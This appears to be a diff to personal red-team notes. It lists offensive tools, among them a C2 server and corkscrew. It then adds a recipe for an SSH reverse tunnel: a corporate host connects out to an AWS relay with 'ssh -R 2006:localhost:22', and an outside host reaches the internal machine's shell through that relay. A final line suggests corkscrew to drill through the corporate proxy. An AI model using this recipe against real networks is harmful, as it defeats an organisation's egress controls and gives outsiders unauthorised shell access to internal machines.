@@ -2,3 +2,16 @@ corkscrew
 ps attack
 simple python tcp server / client
 amazon c2 server
+egress buster
+
+a.corp.com ---> c.amazon.com
+                c.amazon.com <----  b.public.net
+       c.amazon.com -> c.amazon.com:2006
+a.corp.com <----------------------- b.public.net  
+
+from a: ssh -R 2006:localhost:22 aws@c.amazon.com
+from b: ssh aws@c.amazon.com
+on b: ssh -p 2006 userA@localhost
+
+combine with corkscrew in first step to drill through corporate proxy
+
